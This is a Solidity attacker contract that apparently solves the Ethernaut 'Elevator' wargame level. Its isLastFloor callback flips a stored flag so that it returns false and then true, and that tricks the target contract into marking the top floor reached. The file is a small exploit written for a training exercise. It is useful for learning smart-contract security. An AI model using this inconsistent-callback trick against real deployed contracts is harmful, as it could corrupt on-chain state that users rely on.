// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import {Elevator} from "./Elevator.sol";

contract ElevatorAttacker {
    bool switcher = false;

    Elevator public elevator;

    constructor(address _elevator) {
        elevator = Elevator(_elevator);
    }

    function goTo(uint _floor) public {
        elevator.goTo(_floor);
    }

    function isLastFloor(uint _floor) external returns (bool) {
        if (switcher) {
            switcher = false;
            return true;
        } else {
            switcher = true;
            return false;
        }
    }

    function checkTop() public view returns (bool) {
        return elevator.top();
    }

    function checkFloor() public view returns (uint) {
        return elevator.floor();
    }
}
